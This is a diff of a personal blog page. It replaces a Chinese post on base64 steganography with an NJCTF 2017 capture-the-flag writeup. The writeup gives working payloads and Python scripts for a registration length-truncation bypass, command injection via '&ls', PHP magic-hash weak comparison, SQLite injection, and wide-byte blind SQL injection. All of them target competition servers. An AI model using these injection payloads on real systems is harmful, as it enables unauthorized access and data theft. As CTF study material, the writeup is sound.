@@ -73,8 +73,6 @@
 
 
 
-  
-
 
   <link rel="alternate" href="/atom.xml" title="AirBoi" type="application/atom+xml" />
 
@@ -83,22 +81,22 @@
 
 
 
-<meta name="description" content="0X01 编码 何为base64编码From Wiki: Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于2的6次方等于64，所以每6个比特为一个单元，对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节可表示4个可打印字符。它可用来作为电子邮件的传输编码。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个">
+<meta name="description" content="XCTF_OJ练习网站上周末参加了NJCTF 2017，疯狂砍题队伍排名才50多，还是感觉很菜，看了大佬们的writeup，来复现一下，学习新姿势。 附上本人的解题思路（渣渣一枚，大佬勿喷）">
 <meta property="og:type" content="article">
-<meta property="og:title" content="浅析base64编码与base64隐写">
-<meta property="og:url" content="http://yoursite.com/2018/04/17/浅析base64编码与base64隐写/index.html">
+<meta property="og:title" content="AirBoi">
+<meta property="og:url" content="http://yoursite.com/2017/05/31/NJCTF2017-writeup/index.html">
 <meta property="og:site_name" content="AirBoi">
-<meta property="og:description" content="0X01 编码 何为base64编码From Wiki: Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于2的6次方等于64，所以每6个比特为一个单元，对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节可表示4个可打印字符。它可用来作为电子邮件的传输编码。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个">
+<meta property="og:description" content="XCTF_OJ练习网站上周末参加了NJCTF 2017，疯狂砍题队伍排名才50多，还是感觉很菜，看了大佬们的writeup，来复现一下，学习新姿势。 附上本人的解题思路（渣渣一枚，大佬勿喷）">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://i1.piimg.com/588293/6c86a8c299939b1f.png">
-<meta property="og:image" content="http://i1.piimg.com/588293/353fc6c3512865e1.png">
-<meta property="og:image" content="http://i1.piimg.com/588293/fc36644fbd6b0c3d.png">
-<meta property="og:image" content="http://i1.piimg.com/588293/fc36644fbd6b0c3d.png">
-<meta property="og:updated_time" content="2018-04-17T03:01:41.823Z">
+<meta property="og:image" content="http://linkboi.top/usr/uploads/2017/03/4290578751.png">
+<meta property="og:image" content="http://linkboi.top/usr/uploads/2017/03/2237024545.png">
+<meta property="og:image" content="http://i1.piimg.com/588293/1799fbf62baab25d.png">
+<meta property="og:image" content="http://i1.piimg.com/588293/f19cf4b7ff042529.png">
+<meta property="og:updated_time" content="2017-05-31T02:07:25.684Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="浅析base64编码与base64隐写">
-<meta name="twitter:description" content="0X01 编码 何为base64编码From Wiki: Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于2的6次方等于64，所以每6个比特为一个单元，对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节可表示4个可打印字符。它可用来作为电子邮件的传输编码。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个">
-<meta name="twitter:image" content="http://i1.piimg.com/588293/6c86a8c299939b1f.png">
+<meta name="twitter:title" content="AirBoi">
+<meta name="twitter:description" content="XCTF_OJ练习网站上周末参加了NJCTF 2017，疯狂砍题队伍排名才50多，还是感觉很菜，看了大佬们的writeup，来复现一下，学习新姿势。 附上本人的解题思路（渣渣一枚，大佬勿喷）">
+<meta name="twitter:image" content="http://linkboi.top/usr/uploads/2017/03/4290578751.png">
 
 
 
@@ -128,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/04/17/浅析base64编码与base64隐写/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/05/31/NJCTF2017-writeup/"/>
 
 
 
 
 
-  <title>浅析base64编码与base64隐写 | AirBoi</title>
+  <title> | AirBoi</title>
   
 
 
@@ -271,7 +269,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/17/浅析base64编码与base64隐写/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/31/NJCTF2017-writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Boi">
@@ -288,7 +286,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">浅析base64编码与base64隐写</h1>
+          <h1 class="post-title" itemprop="name headline"></h1>
         
 
         <div class="post-meta">
@@ -300,8 +298,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-17T11:00:39+08:00">
-                2018-04-17
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-31T10:07:25+08:00">
+                2017-05-31
               </time>
             
 
@@ -338,61 +336,164 @@
       
 
       
-        <h1 id="0X01-编码"><a href="#0X01-编码" class="headerlink" title="0X01 编码"></a>0X01 编码</h1><hr>
-<h3 id="何为base64编码"><a href="#何为base64编码" class="headerlink" title="何为base64编码"></a>何为base64编码</h3><p>From Wiki:</p>
-<p>Base64是一种基于<code>64</code>个可打印字符来表示<code>二进制数据</code>的表示方法。由于2的6次方等于64，所以<code>每6个比特为一个单元</code>，对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节可表示4个可打印字符。它可用来作为电子邮件的传输编码。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有<code>62</code>个字符，此外两个可打印符号在不同的系统中而不同。一些如uuencode的其他编码方法，和之后binhex的版本使用不同的64字符集来代表6个二进制数字，但是它们不叫Base64。</p>
-<p>Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email、在XML中存储复杂数据。</p>
-<h3 id="base64编码实例"><a href="#base64编码实例" class="headerlink" title="base64编码实例"></a>base64编码实例</h3><p><img src="http://i1.piimg.com/588293/6c86a8c299939b1f.png" alt="Man的编码"></p>
-<p>在这个例子中,”Man”三个字符被<code>base64</code>算法编码为四个字符。</p>
-<p>第一步，”M”、”a”、”n”的ASCII值分别是77、97、110，对应的二进制值是01001101、01100001、01101110，将它们连成一个24位的二进制字符串010011010110000101101110。<br>第二步，将这个24位的二进制字符串分成4组，每组6个二进制位：010011、010110、000101、101110。<br>第三步，在每组前面加两个00，扩展成32个二进制位，即四个字节：00010011、00010110、00000101、00101110。它们的十进制值分别是19、22、5、46。<br>第四步，根据下表，得到每个值对应Base64编码，即T、W、F、u。</p>
-<ul>
-<li>Base64索引表:</li>
-</ul>
-<p><img src="http://i1.piimg.com/588293/353fc6c3512865e1.png" alt="base64索引表"></p>
-<ul>
-<li><strong>字节数不足3时</strong>，这样处理:</li>
-</ul>
-<p>如果要编码的字节数不能被3整除，最后会多出<code>1个或2</code>个字节，那么可以使用下面的方法进行处理：先使用0字节值在<code>末尾</code>补足，使其能够被3整除，然后再进行base64的编码。在编码后的base64文本后加上一个或两个’=’号，代表补足的字节数。也就是说，当最后剩余<code>一个八位字节</code>（一个byte）时，最后一个6位的base64字节块有<code>四位是0值</code>，最后<code>附加上两个等号</code>;如果最后<code>剩余两个八位字节</code>（2个byte）时，最后一个6位的base字节块有<code>两位是0值</code>，最后<code>附加一个等号</code>。参考下表：<br><img src="http://i1.piimg.com/588293/fc36644fbd6b0c3d.png" alt="base64"></p>
-<h1 id="0x02-隐写"><a href="#0x02-隐写" class="headerlink" title="0x02 隐写"></a>0x02 隐写</h1><hr>
-<p>上面讲到了当字节数不足3时的处理方法，会在编码后的文本后加上一个或两个’=’，这里等号是可以隐藏信息的，这种隐写方式以前从未见过，上周的<code>NJCTF</code>中涉足后，颇为震惊，花了几个小时理解原理，在此附上。</p>
-<h3 id="解码规则"><a href="#解码规则" class="headerlink" title="解码规则"></a>解码规则</h3><p>首先，我们需要了解base64解码的规则，首先检查base64语句后有多少个’=’，然后把字符串按照<code>4*6=24</code>个二进制位一组切分，删除<code>&#39;=&#39;个数*8</code>个bit,按照6个bit一组通过映射表转为字符。<br>如图:<img src="http://i1.piimg.com/588293/fc36644fbd6b0c3d.png" alt="解码"></p>
-<p>上图中加粗的’0’可以用作二进制隐写，这样既不影响原文的还原，也不影响padding的删除，唯一的影响，上图的QQ==中第二个Q会变化，QkM=的M会变化，所以base64可以用于隐写。<br>然后附上国外大牛的py脚本。</p>
+        <p><a href="http://oj.xctf.org.cn/" target="_blank" rel="noopener">XCTF_OJ练习网站</a><br>上周末参加了NJCTF 2017，疯狂砍题队伍排名才50多，还是感觉很菜，看了大佬们的writeup，来复现一下，学习新姿势。</p>
+<p>附上本人的解题思路（渣渣一枚，大佬勿喷）</p>
+<a id="more"></a>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p><img src="http://linkboi.top/usr/uploads/2017/03/4290578751.png" alt="2017-03-16 下午12.14.55.png"></p>
+<p>试了多次sql注入，都不行，偶然一次发现有字符长度限制，想到可能是注册时<code>拼接</code>到数据库时有长度限制</p>
+<pre>payload:
+注册admin+n多空格+abc字符
+</pre>
+登陆时用admin和注册的密码，即可getflag.
+
+![2017-03-16 下午12.14.55.png][3]
+
+
+
+
+### Get Flag
+![屏幕快照 2017-03-16 下午12.34.53.png][4]
+
+
+`本地文件包含漏洞（LFI）`
+
+这道题首先想到能不能找上层目录的文件 *../flag.php* 之类，结果猜不到文件，想是否可以利用管道'|' `ls`一下 结果提示'too young too simple'  多次尝试发现'|'被过滤了，还有'*' 等等。
+
+#### 思路1：尝试过程中发现通配符：`?`没有被过滤,于是放到burpsuite里面跑一下看看有没有对应的文件,因为跑的周期太长，这道题又设置了延迟五秒，官方说是防止爆破，于是尝试其他方法。
+
+
+#### 思路2：尝试过程中发现&没有过滤，导致列目录
+贴上代码
+<pre><code class="python">
+# coding:utf8
+import requests
+import base64
+import re
+url = "http://218.2.197.235:23725/hehe"
+s = requests.session()
+req = s.get(url)
+data = {'flag':"1&ls ../../../../../"}
+res = s.post(url, data)
+cont = res.content
+rcont = "".join(re.findall('".*"',cont))[1:-1].split(",")[1]
+print(base64.b64decode(rcont))
+</code></pre>
+运行结果:
+
+![屏幕快照 2017-03-16 下午12.49.04.png][5]
+
+
+读到flag:
 <pre>
-<code class="python">
-def get_base64_diff_value(s1, s2):
-base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-res = 0
-for i in xrange(len(s1)):
-if s1[i] != s2[i]:
-return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))
-return res
-def solve_stego():
-with open('stego.txt', 'rb') as f:
-file_lines = f.readlines()
-bin_str = ''
-for line in file_lines:
-steg_line = line.replace('\n', '')
-norm_line = line.replace('\n', '').decode('base64').encode('base64').replace('\n', '')
-diff = get_base64_diff_value(steg_line, norm_line)
-pads_num = steg_line.count('=')
-if diff:
-bin_str += bin(diff)[2:].zfill(pads_num * 2)
-else:
-bin_str += '0' * pads_num * 2
-res_str = ''
-for i in xrange(0, len(bin_str), 8):
-res_str += chr(int(bin_str[i:i+8], 2))
-print res_str
-solve_stego()
-</code>
+Macboi:~ boi$ python /Users/boi/Desktop/py/getflag.py 
+cat: images/1: No such file or directory
+NJCTF{Simp13_Pyth0n_C0de_Inj3cti0n_a77ack}
 </pre>
 
-<p>And:一个base64隐写栗子,请自行下载测试。<a href="http://shell-storm.org/repo/CTF/Olympic-2014/Find_da_Key/stego.txt" target="_blank" rel="noopener">stego.txt</a></p>
-<p>引用：</p>
-<ul>
-<li><a href="http://delimitry.blogspot.com/2014/02/olympic-ctf-2014-find-da-key-writeup.html" target="_blank" rel="noopener">http://delimitry.blogspot.com/2014/02/olympic-ctf-2014-find-da-key-writeup.html</a></li>
-<li><a href="https://tools.ietf.org/html/rfc4648" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc4648</a></li>
-</ul>
+<h3 id="Wallet-题目描述-钱包里面有flag"><a href="#Wallet-题目描述-钱包里面有flag" class="headerlink" title="Wallet 题目描述 钱包里面有flag"></a>Wallet 题目描述 钱包里面有flag</h3><p>首先在about页面读到</p>
+<pre>Get Y0u Money?! authenticate admin cookies using hash.233333333:XD</pre>
+然后在admin页面看，没有登录
+猜测是改cookie,Burp看一下:
+
+![屏幕快照 2017-03-16 下午1.05.12.png][6]
+
+
+
+
+
+
+
+
+
+如图，auth和hsh这两个参数可疑，hsh应该是某个数的md5,auth根据题意，应该是提交一个hash，到这里做不下去了，大佬提示看下目录，扫出了www.zip，下载下来，压缩包有密码...官方提示弱口令，群里各种大佬直呼几十G字典跑不出来，口令有多弱，结束比赛后，被告知为`njctf2016` 解压后有php加密，[在线解密][7]后，查看源码:
+<pre><code class="php">
+require_once "db.php";
+$auth = 0;
+if (isset($_COOKIE["auth"])) {
+    $auth = $_COOKIE["auth"];
+    $hsh = $_COOKIE["hsh"];
+    if ($auth == $hsh) {
+        $auth = 0;
+    } else {
+        if (sha1((string) $hsh) == md5((string) $auth)) {
+            $auth = 1;
+        } else {
+            $auth = 0;
+        }
+    }
+} else {
+    $auth = 0;
+    $s = $auth;
+    setcookie("auth", $s);
+    setcookie("hsh", sha1((string) $s));
+}
+if ($auth) {
+    if (isset($_GET['query'])) {
+        $db = new SQLite3($SQL_DATABASE, SQLITE3_OPEN_READONLY);
+        $qstr = SQLITE3::escapeString($_GET['query']);
+        $query = "SELECT amount FROM my_wallets WHERE id={$qstr}";
+        $result = $db->querySingle($query);
+        if (!$result === NULL) {
+            echo "Error - invalid query";
+        } else {
+            echo "Wallet contains: {$result}";
+        }
+    } else {
+        echo strip_tags(" html  head  title Admin Page /title  /head  body Welcome to the admin panel! br /  br /  form name='input' action='admin.php' method='get' Wallet ID:  input type='text' name='query'  input type='submit' value='Submit Query'  /form  /body  /html ");
+    }
+} else {
+    echo "Sorry, not authorized.";
+}
+</code></pre>
+
+<p>重点在<code>sha1((string) $hsh) == md5((string) $auth)</code>这句话，于是猜测到0e开头的md5和一个hash值的弱类型判断，测试得到payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">'QNKCDZO'</span>)==sha1(<span class="string">'aaroZmOk'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>成功登陆<br><img src="http://linkboi.top/usr/uploads/2017/03/2237024545.png" alt="屏幕快照 2017-03-16 下午1.25.20.png"></p>
+<p>分析源码，发现是个sqlite的sql注入</p>
+<p>SQLITE 没有像 MySQL 中那样包含所有数据库、表、列的 information_schema 库。事实上，对于它而言，没有库的概念，直接对象是表，但是它是有系统表的，即 <code>sqlite_master</code>,在表中可以查到之前的操作:<br><img src="http://i1.piimg.com/588293/1799fbf62baab25d.png" alt="sql"></p>
+<p>最后 getflag:</p>
+<p><img src="http://i1.piimg.com/588293/f19cf4b7ff042529.png" alt="请输入图片描述"></p>
+<h3 id="Come-on"><a href="#Come-on" class="headerlink" title="Come_on"></a>Come_on</h3><p>一道<code>宽字节</code>盲注题，用到了mysql的<code>left</code>和<code>right</code>函数，此处先给出payload和脚本，我们再进行分析</p>
+<pre>payload:if((select(right(left((select(flag)from(flag)),1),1)))=binary(0x4e),1,0)%23</pre>
+<pre><code class="python">
+# coding=utf-8
+import requests
+import random
+import hashlib
+s = requests.Session()
+def get_flag():
+    url='http://218.2.197.235:23733/index.php?key=123%df%27||'
+    flag = ""
+    string = 'abcdefghijklmnopqrstuvwxyzABCEDFGHIJKLMNOPQRSTUVWXYZ1234567890\{\}_'
+    payload = "if((select(right(left((select(flag)from(flag)),{}),1)))=binary({}),1,0)%23"
+    for j in range(1,34):
+        for i in string:
+            r = get_data(url + payload.format(str(j), hex(ord(i))))
+            if "002265" in r:
+                #print url + payload.format(str(j), hex(ord(i)))
+                flag +=i
+                print flag
+                break
+def get_data(url):
+    r = s.get(url)
+    return r.text
+get_flag()
+</code></pre>
+
+<p>首先，测试的时候发现union,’&gt;’,’&lt;’和大把的盲注函数都被过滤了，最后只剩下<code>left</code>和<code>right</code>，这里讲一下这两个函数的功能:</p>
+<blockquote>
+<p><code>LEFT</code>(str,len)<br>返回字符串str的最左面len个字符。<br>mysql&gt; select LEFT(‘foobarbar’, 5);<br>           -&gt; ‘fooba’<br>该函数是多字节可靠的。</p>
+<p><code>RIGHT</code>(str,len)<br>返回字符串str的最右面len个字符。<br>mysql&gt; select RIGHT(‘foobarbar’, 4);<br>           -&gt; ‘rbar’<br>该函数是多字节可靠的。</p>
+</blockquote>
+<p>我们再来由内而外解释一下payload:</p>
+<blockquote>
+<ol>
+<li>(select(flag)from(flag)) #从flag表中查flag字段</li>
+<li>left((select(flag)from(flag)),<code>x</code>) #对于flag字段，从左至右选取x个字符</li>
+<li>right(left((select(flag)from(flag)),<code>x</code>),1) #从右向左取x个字符的最后一个</li>
+<li>if((select(right(left((select(flag)from(flag)),<code>x</code>),1)))=binary(<code>y</code>),1,0) #这里利用了<code>if判断</code>和<code>binary()</code>函数，类似于三元表达式，如果select的结果等于binary(y)得到的十六进制字符，则返回1，否则返回0</li>
+</ol>
+</blockquote>
+<p>最后，脚本跑出flag:NJCTF{5H0W_M3_S0M3_sQ1i_TrICk5}</p>
 
       
     </div>
@@ -417,8 +518,8 @@ solve_stego()
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/17/phpok1-4审计/" rel="next" title="phpok1.4审计">
-                <i class="fa fa-chevron-left"></i> phpok1.4审计
+              <a href="/2017/05/31/Error-Based-SQL Injection/" rel="next" title="">
+                <i class="fa fa-chevron-left"></i> 
               </a>
             
           </div>
@@ -426,6 +527,10 @@ solve_stego()
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/04/17/phpok1-4审计/" rel="prev" title="phpok1.4审计">
+                phpok1.4审计 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -555,7 +660,7 @@ solve_stego()
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0X01-编码"><span class="nav-number">1.</span> <span class="nav-text">0X01 编码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#何为base64编码"><span class="nav-number">1.0.1.</span> <span class="nav-text">何为base64编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base64编码实例"><span class="nav-number">1.0.2.</span> <span class="nav-text">base64编码实例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-隐写"><span class="nav-number">2.</span> <span class="nav-text">0x02 隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#解码规则"><span class="nav-number">2.0.1.</span> <span class="nav-text">解码规则</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Login"><span class="nav-number">1.1.</span> <span class="nav-text">Login</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Wallet-题目描述-钱包里面有flag"><span class="nav-number">1.2.</span> <span class="nav-text">Wallet 题目描述 钱包里面有flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Come-on"><span class="nav-number">1.3.</span> <span class="nav-text">Come_on</span></a></li></ol></li></ol></div>
             
 
           </div>
